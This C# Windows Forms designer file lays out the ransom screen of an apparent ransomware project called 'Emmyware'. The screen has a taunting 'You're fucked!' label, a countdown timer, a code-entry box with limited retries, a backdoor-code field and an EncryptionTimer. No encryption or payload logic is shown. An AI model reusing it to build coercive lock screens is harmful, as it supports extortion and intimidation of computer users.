
namespace Emmyware
{
    partial class RansomFrm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RansomFrm));
            this.YoshiImageBox = new System.Windows.Forms.PictureBox();
            this.FuckedLabel = new System.Windows.Forms.Label();
            this.TimerProgressBar = new System.Windows.Forms.ProgressBar();
            this.ResetTimerButton = new System.Windows.Forms.Button();
            this.WhatHappenLabel = new System.Windows.Forms.Label();
            this.TimerLabel = new System.Windows.Forms.Label();
            this.RetryAttemptsLabel = new System.Windows.Forms.Label();
            this.CodeTextBox = new System.Windows.Forms.TextBox();
            this.CheckCodeButton = new System.Windows.Forms.Button();
            this.CheckBackdoorButton = new System.Windows.Forms.Button();
            this.BackdoorTextBox = new System.Windows.Forms.TextBox();
            this.BackdoorLabel = new System.Windows.Forms.Label();
            this.AdminPanelButton = new System.Windows.Forms.Button();
            this.EncryptionTimer = new System.Windows.Forms.Timer(this.components);
            ((System.ComponentModel.ISupportInitialize)(this.YoshiImageBox)).BeginInit();
            this.SuspendLayout();
            // 
            // YoshiImageBox
            // 
            this.YoshiImageBox.BackColor = System.Drawing.Color.White;
            this.YoshiImageBox.Image = global::Emmyware.Properties.Resources.dc6qmok_7e7054dd_d7cf_415a_8c5e_938b1b999e46;
            this.YoshiImageBox.Location = new System.Drawing.Point(0, 0);
            this.YoshiImageBox.Name = "YoshiImageBox";
            this.YoshiImageBox.Size = new System.Drawing.Size(402, 510);
            this.YoshiImageBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.YoshiImageBox.TabIndex = 0;
            this.YoshiImageBox.TabStop = false;
            // 
            // FuckedLabel
            // 
            this.FuckedLabel.AutoSize = true;
            this.FuckedLabel.Font = new System.Drawing.Font("Comic Sans MS", 48F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FuckedLabel.Location = new System.Drawing.Point(454, 9);
            this.FuckedLabel.Name = "FuckedLabel";
            this.FuckedLabel.Size = new System.Drawing.Size(478, 90);
            this.FuckedLabel.TabIndex = 1;
            this.FuckedLabel.Text = "You\'re fucked!";
            // 
            // TimerProgressBar
            // 
            this.TimerProgressBar.Location = new System.Drawing.Point(526, 472);
            this.TimerProgressBar.Name = "TimerProgressBar";
            this.TimerProgressBar.Size = new System.Drawing.Size(435, 25);
            this.TimerProgressBar.TabIndex = 2;
            // 
            // ResetTimerButton
            // 
            this.ResetTimerButton.Location = new System.Drawing.Point(410, 474);
            this.ResetTimerButton.Name = "ResetTimerButton";
            this.ResetTimerButton.Size = new System.Drawing.Size(111, 23);
            this.ResetTimerButton.TabIndex = 3;
            this.ResetTimerButton.Text = "Reset Timer";
            this.ResetTimerButton.UseVisualStyleBackColor = true;
            this.ResetTimerButton.Click += new System.EventHandler(this.ResetTimerButton_Click);
            // 
            // WhatHappenLabel
            // 
            this.WhatHappenLabel.AutoSize = true;
            this.WhatHappenLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.WhatHappenLabel.Location = new System.Drawing.Point(445, 99);
            this.WhatHappenLabel.Name = "WhatHappenLabel";
            this.WhatHappenLabel.Size = new System.Drawing.Size(491, 96);
            this.WhatHappenLabel.TabIndex = 4;
            this.WhatHappenLabel.Text = resources.GetString("WhatHappenLabel.Text");
            // 
            // TimerLabel
            // 
            this.TimerLabel.AutoSize = true;
            this.TimerLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.TimerLabel.Location = new System.Drawing.Point(523, 451);
            this.TimerLabel.Name = "TimerLabel";
            this.TimerLabel.Size = new System.Drawing.Size(36, 18);
            this.TimerLabel.TabIndex = 5;
            this.TimerLabel.Text = "5:00";
            // 
            // RetryAttemptsLabel
            // 
            this.RetryAttemptsLabel.AutoSize = true;
            this.RetryAttemptsLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.RetryAttemptsLabel.Location = new System.Drawing.Point(571, 223);
            this.RetryAttemptsLabel.Name = "RetryAttemptsLabel";
            this.RetryAttemptsLabel.Size = new System.Drawing.Size(252, 25);
            this.RetryAttemptsLabel.TabIndex = 6;
            this.RetryAttemptsLabel.Text = "Code Attempt Retries: 10";
            // 
            // CodeTextBox
            // 
            this.CodeTextBox.Location = new System.Drawing.Point(537, 260);
            this.CodeTextBox.Name = "CodeTextBox";
            this.CodeTextBox.Size = new System.Drawing.Size(255, 20);
            this.CodeTextBox.TabIndex = 7;
            // 
            // CheckCodeButton
            // 
            this.CheckCodeButton.Location = new System.Drawing.Point(798, 258);
            this.CheckCodeButton.Name = "CheckCodeButton";
            this.CheckCodeButton.Size = new System.Drawing.Size(75, 23);
            this.CheckCodeButton.TabIndex = 8;
            this.CheckCodeButton.Text = "Check";
            this.CheckCodeButton.UseVisualStyleBackColor = true;
            this.CheckCodeButton.Click += new System.EventHandler(this.CheckCodeButton_Click);
            // 
            // CheckBackdoorButton
            // 
            this.CheckBackdoorButton.Location = new System.Drawing.Point(761, 306);
            this.CheckBackdoorButton.Name = "CheckBackdoorButton";
            this.CheckBackdoorButton.Size = new System.Drawing.Size(127, 23);
            this.CheckBackdoorButton.TabIndex = 9;
            this.CheckBackdoorButton.Text = "Check Backdoor Code";
            this.CheckBackdoorButton.UseVisualStyleBackColor = true;
            this.CheckBackdoorButton.Click += new System.EventHandler(this.CheckBackdoorButton_Click);
            // 
            // BackdoorTextBox
            // 
            this.BackdoorTextBox.Location = new System.Drawing.Point(578, 309);
            this.BackdoorTextBox.Name = "BackdoorTextBox";
            this.BackdoorTextBox.Size = new System.Drawing.Size(177, 20);
            this.BackdoorTextBox.TabIndex = 10;
            // 
            // BackdoorLabel
            // 
            this.BackdoorLabel.AutoSize = true;
            this.BackdoorLabel.Location = new System.Drawing.Point(493, 312);
            this.BackdoorLabel.Name = "BackdoorLabel";
            this.BackdoorLabel.Size = new System.Drawing.Size(84, 13);
            this.BackdoorLabel.TabIndex = 11;
            this.BackdoorLabel.Text = "Backdoor Code:";
            // 
            // AdminPanelButton
            // 
            this.AdminPanelButton.Location = new System.Drawing.Point(513, 351);
            this.AdminPanelButton.Name = "AdminPanelButton";
            this.AdminPanelButton.Size = new System.Drawing.Size(375, 72);
            this.AdminPanelButton.TabIndex = 12;
            this.AdminPanelButton.Text = "Admin Panel";
            this.AdminPanelButton.UseVisualStyleBackColor = true;
            // 
            // EncryptionTimer
            // 
            this.EncryptionTimer.Interval = 1000;
            this.EncryptionTimer.Tick += new System.EventHandler(this.EncryptionTimer_Tick);
            // 
            // RansomFrm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.ClientSize = new System.Drawing.Size(973, 510);
            this.ControlBox = false;
            this.Controls.Add(this.AdminPanelButton);
            this.Controls.Add(this.BackdoorLabel);
            this.Controls.Add(this.BackdoorTextBox);
            this.Controls.Add(this.CheckBackdoorButton);
            this.Controls.Add(this.CheckCodeButton);
            this.Controls.Add(this.CodeTextBox);
            this.Controls.Add(this.RetryAttemptsLabel);
            this.Controls.Add(this.TimerLabel);
            this.Controls.Add(this.WhatHappenLabel);
            this.Controls.Add(this.ResetTimerButton);
            this.Controls.Add(this.TimerProgressBar);
            this.Controls.Add(this.FuckedLabel);
            this.Controls.Add(this.YoshiImageBox);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "RansomFrm";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Warning";
            this.Load += new System.EventHandler(this.RansomFrm_Load);
            ((System.ComponentModel.ISupportInitialize)(this.YoshiImageBox)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox YoshiImageBox;
        private System.Windows.Forms.Label FuckedLabel;
        private System.Windows.Forms.ProgressBar TimerProgressBar;
        private System.Windows.Forms.Button ResetTimerButton;
        private System.Windows.Forms.Label WhatHappenLabel;
        private System.Windows.Forms.Label TimerLabel;
        private System.Windows.Forms.Label RetryAttemptsLabel;
        private System.Windows.Forms.TextBox CodeTextBox;
        private System.Windows.Forms.Button CheckCodeButton;
        private System.Windows.Forms.Button CheckBackdoorButton;
        private System.Windows.Forms.TextBox BackdoorTextBox;
        private System.Windows.Forms.Label BackdoorLabel;
        private System.Windows.Forms.Button AdminPanelButton;
        private System.Windows.Forms.Timer EncryptionTimer;
    }
}

